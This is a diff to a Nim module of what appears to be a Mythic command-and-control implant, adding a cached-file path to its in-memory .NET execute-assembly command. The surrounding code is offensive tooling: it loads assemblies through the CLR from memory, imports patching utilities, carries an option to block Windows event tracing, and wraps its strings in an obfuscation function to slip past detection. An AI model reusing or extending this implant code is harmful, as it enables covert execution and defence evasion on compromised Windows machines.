@@ -1,12 +1,12 @@
 import json
 import ../utils/strenc
+import ../global_data
 
 when defined(windows):
   import base64
   import winim/clr except `[]`
   import winim/lean
   import ../utils/patches
-  import ../utils/strenc
   
   type
     ExecuteAssemblyArgs = object
@@ -16,6 +16,11 @@ when defined(windows):
       block_etw_arg: bool
 
 const CHUNK_SIZE = 512000  # 512KB chunks
+
+# Forward declaration
+proc processExecuteAssemblyChunk*(taskId: string, params: JsonNode, chunkData: string, 
+                                   totalChunks: int, currentChunk: int, 
+                                   fileData: var seq[byte]): JsonNode
 
 proc executeAssembly*(taskId: string, params: JsonNode): JsonNode =
   ## Execute a .NET assembly from memory
@@ -29,6 +34,25 @@ proc executeAssembly*(taskId: string, params: JsonNode): JsonNode =
     }
   else:
     try:
+      # Check if using cached file first (no uuid needed)
+      if params.hasKey(obf("cached")):
+        let cachedName = params[obf("cached")].getStr()
+        let cachedData = getCachedFile(cachedName)
+        if cachedData.len == 0:
+          return %*{
+            obf("task_id"): taskId,
+            obf("completed"): true,
+            obf("status"): "error",
+            obf("user_output"): obf("File not found in cache. Use register_file first: ") & cachedName
+          }
+        # Build params with dummy uuid for downstream parsing
+        var cachedParams = copy(params)
+        if not cachedParams.hasKey(obf("uuid")):
+          cachedParams[obf("uuid")] = %""
+        var fileData = cachedData
+        return processExecuteAssemblyChunk(taskId, cachedParams, "", 1, 1, fileData)
+      
+      # Non-cached: parse full args (uuid required)
       let args = to(params, ExecuteAssemblyArgs)
       
       # Step 1: Request the assembly file from Mythic
